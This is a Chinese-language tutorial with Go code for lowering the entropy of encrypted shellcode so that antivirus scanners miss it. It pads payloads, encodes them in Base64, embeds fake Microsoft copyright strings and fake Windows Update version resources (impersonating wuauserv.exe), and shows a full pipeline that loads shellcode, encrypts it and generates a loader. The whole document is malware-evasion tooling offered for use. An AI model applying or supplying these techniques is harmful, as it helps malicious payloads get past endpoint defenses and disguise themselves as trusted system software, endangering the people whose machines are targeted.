# 减熵处理技术

## 1. 熵值检测原理

**原理：**
- 杀软使用熵值检测识别可疑文件
- 高熵值文件（熵>7）容易被标记为恶意
- 加密/压缩后的数据熵值较高
- 需要添加低熵数据降低整体熵值

**熵值计算公式：**
```
Entropy = -Σ(p(x) * log2(p(x)))
```
其中 p(x) 是字节x出现的概率

---

## 2. Go实现

### 2.1 计算熵值

```go
package main

import (
    "math"
    "os"
    "unsafe"
)

// 计算文件熵值
func calculateEntropy(data []byte) float64 {
    if len(data) == 0 {
        return 0
    }

    // 统计字节频率
    freq := make(map[byte]int)
    for _, b := range data {
        freq[b]++
    }

    // 计算熵值
    var entropy float64
    size := float64(len(data))

    for _, count := range freq {
        p := float64(count) / size
        entropy -= p * math.Log2(p)
    }

    return entropy
}

// 检测文件熵值
func checkFileEntropy(filePath string) float64 {
    data, err := os.ReadFile(filePath)
    if err != nil {
        return 0
    }
    return calculateEntropy(data)
}
```

### 2.2 降低熵值的方法

#### 方法1：添加低熵数据

```go
// 添加重复字节降低熵值
func addLowEntropyData(data []byte, paddingSize int) []byte {
    // 重复0x00字节（最低熵）
    padding := make([]byte, paddingSize)
    // 或者使用重复的0xFF、0xAA等

    result := append(data, padding...)
    return result
}

// 添加随机低熵数据
func addRandomLowEntropy(data []byte, paddingSize int) []byte {
    // 使用有限的字节范围（如只使用10种不同字节）
    padding := make([]byte, paddingSize)
    for i := 0; i < paddingSize; i++ {
        padding[i] = byte(i % 10) // 只使用0-9共10种字节
    }

    result := append(data, padding...)
    return result
}
```

#### 方法2：添加文本数据

```go
// 添加ASCII文本数据（低熵）
func addTextData(data []byte, text string) []byte {
    textBytes := []byte(text)
    result := append(data, textBytes...)
    return result
}

// 添加伪版权信息
func addFakeCopyright(data []byte) []byte {
    copyright := "Copyright (C) 2024 Microsoft Corporation. All rights reserved. " +
        "This product is licensed under the MIT License. " +
        "For more information, visit https://www.microsoft.com"

    // 重复添加多次
    for i := 0; i < 10; i++ {
        data = append(data, []byte(copyright)...)
    }

    return data
}
```

#### 方法3：添加伪PE数据

```go
// 添加伪PE节区数据
func addFakePESection(data []byte) []byte {
    // 模拟合法PE文件的节区数据
    // 使用常见的低熵模式

    fakeSection := []byte{
        // 模拟导入表数据
        0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, // "KERNEL32"
        0x2E, 0x44, 0x4C, 0x4C, 0x00, // ".dll\0"
        // 重复填充
        0x00, 0x00, 0x00, 0x00,
    }

    // 重复添加
    for i := 0; i < 100; i++ {
        data = append(data, fakeSection...)
    }

    return data
}
```

#### 方法4：使用Base64编码

```go
import (
    "encoding/base64"
)

// Base64编码降低熵值
func encodeBase64(data []byte) []byte {
    // Base64编码后的熵值通常在5-6之间
    encoded := base64.StdEncoding.EncodeToString(data)
    return []byte(encoded)
}

// Base64解码
func decodeBase64(data []byte) ([]byte, error) {
    return base64.StdEncoding.DecodeString(string(data))
}
```

---

## 3. 编译时嵌入低熵数据

### 3.1 Go代码嵌入

```go
// 在Go代码中嵌入大量低熵字符串
var (
    // 伪版权信息（编译时会嵌入到exe中）
    copyrightInfo = `
        Copyright (C) Microsoft Corporation
        Windows Update Service
        Version 10.0.19041.1
        Licensed under MIT License
        https://www.microsoft.com
        For support, contact support.microsoft.com
    `

    // 伪配置信息
    configInfo = `
        [Settings]
        Server=https://update.microsoft.com
        Interval=3600
        Retry=3
        Timeout=30
        LogLevel=Info
        CachePath=C:\Windows\Temp
    `

    // 伪日志信息
    logInfo = `
        [Log]
        Level=Information
        Format=JSON
        Output=File
        Path=C:\Windows\Logs
        MaxSize=10MB
        Rotation=Daily
    `
)

// 使用这些变量（防止编译器优化删除）
func useLowEntropyData() {
    _ = copyrightInfo
    _ = configInfo
    _ = logInfo
}
```

### 3.2 资源文件嵌入

```go
// 使用资源文件嵌入低熵数据
// 创建rsrc.json配置文件

/*
{
    "VersionInfo": {
        "FileVersion": "10.0.19041.1",
        "ProductVersion": "10.0.19041.1",
        "FileFlagsMask": "3f",
        "FileFlags ": "00",
        "FileOS": "040004",
        "FileType": "01",
        "FileSubType": "00"
    },
    "StringFileInfo": {
        "Comments": "Windows Update Service",
        "CompanyName": "Microsoft Corporation",
        "FileDescription": "Windows Update",
        "FileVersion": "10.0.19041.1",
        "InternalName": "wuauserv",
        "LegalCopyright": "Copyright (C) Microsoft Corp.",
        "OriginalFilename": "wuauserv.exe",
        "ProductName": "Windows Update",
        "ProductVersion": "10.0.19041.1"
    },
    "VarFileInfo": {
        "Translation": "080404b0"
    },
    "ManifestResourceID": "#1",
    "Manifest": "app.manifest"
}
*/

// 使用rsrc工具嵌入资源
// go install github.com/akavel/rsrc@latest
// rsrc -manifest app.manifest -o rsrc.syso
// go build
```

---

## 4. 运行时减熵处理

```go
// 运行时添加低熵数据到内存中的shellcode区域
func runtimeEntropyReduction(shellcode []byte) []byte {
    // 在shellcode末尾添加低熵padding
    paddingSize := len(shellcode) / 4 // 添加25%的padding

    // 使用零字节padding
    padding := make([]byte, paddingSize)

    result := append(shellcode, padding...)
    return result
}

// 分段式低熵处理
func segmentedEntropyReduction(data []byte) []byte {
    // 将数据分段，每段添加低熵padding
    segmentSize := 1024 // 每段1KB
    paddingSize := 256  // 每段padding 256B

    result := []byte{}

    for i := 0; i < len(data); i += segmentSize {
        end := i + segmentSize
        if end > len(data) {
            end = len(data)
        }

        // 添加数据段
        result = append(result, data[i:end]...)

        // 添加低熵padding
        padding := make([]byte, paddingSize)
        result = append(result, padding...)
    }

    return result
}
```

---

## 5. 熵值目标

| 熵值范围 | 检测风险 | 说明 |
|----------|----------|------|
| 0-4 | 低 | 低熵，接近纯文本 |
| 4-6 | 低-中 | 正常范围，不易被检测 |
| 6-7 | 中 | 需要警惕，可能被标记 |
| 7-8 | 高 | 高熵，容易被检测 |
| >8 | 很高 | 极高熵，几乎必定被标记 |

**目标：保持熵值在6以下**

---

## 6. 组合减熵策略

```go
// 综合减熵处理
func comprehensiveEntropyReduction(data []byte, targetEntropy float64) []byte {
    currentEntropy := calculateEntropy(data)

    // 如果当前熵值已低于目标，直接返回
    if currentEntropy <= targetEntropy {
        return data
    }

    // 计算需要添加的padding大小
    // 熵值降低公式：需要添加大量低熵数据
    paddingRatio := (currentEntropy - targetEntropy) / currentEntropy
    paddingSize := int(float64(len(data)) * paddingRatio * 2)

    // 添加多种类型的低熵数据
    result := data

    // 1. 添加文本数据
    result = addFakeCopyright(result)

    // 2. 添加重复字节
    result = addLowEntropyData(result, paddingSize/3)

    // 3. 添加伪配置信息
    result = addTextData(result, configInfo)

    // 4. 添加伪PE数据
    result = addFakePESection(result)

    // 检查最终熵值
    finalEntropy := calculateEntropy(result)
    if finalEntropy > targetEntropy {
        // 如果仍然过高，继续添加padding
        morePadding := int(float64(len(result)) * 0.5)
        result = addLowEntropyData(result, morePadding)
    }

    return result
}
```

---

## 7. 实际应用示例

```go
func main() {
    // 加载shellcode
    shellcode := loadShellcode("shellcode.bin")

    // SGN加密
    encryptedShellcode := sgnEncrypt(shellcode)

    // 二次加密（XOR/RC4/AES）
    doubleEncrypted := xorEncrypt(encryptedShellcode, key)

    // Base64编码（降低熵值）
    base64Encoded := encodeBase64(doubleEncrypted)

    // 添加低熵数据
    finalData := comprehensiveEntropyReduction(base64Encoded, 6.0)

    // 检查最终熵值
    finalEntropy := calculateEntropy(finalData)
    fmt.Printf("Final entropy: %.2f\n", finalEntropy)

    // 嵌入到Go代码中生成loader
    generateLoader(finalData)
}
```

---

## 8. 注意事项

1. **不要过度减熵**：过低的熵值（<4）也可能被检测为异常
2. **目标范围**：保持熵值在5-6之间最为安全
3. **自然数据**：添加的低熵数据应看起来自然（如版权信息）
4. **编译优化**：确保添加的数据不会被编译器优化删除
5. **分布均匀**：低熵数据应在文件中均匀分布
6. **结合加密**：先加密再减熵，不要先减熵再加密（会提高熵值）

---

## 9. 检测工具

```bash
# 使用pestudio检测熵值
pestudio.exe -file:loader.exe

# 使用Python计算熵值
python -c "
import math
import sys

def entropy(data):
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    size = len(data)
    return -sum(p/size * math.log2(p/size) for p in freq.values())

data = open(sys.argv[1], 'rb').read()
print(f'Entropy: {entropy(data):.2f}')
" loader.exe
```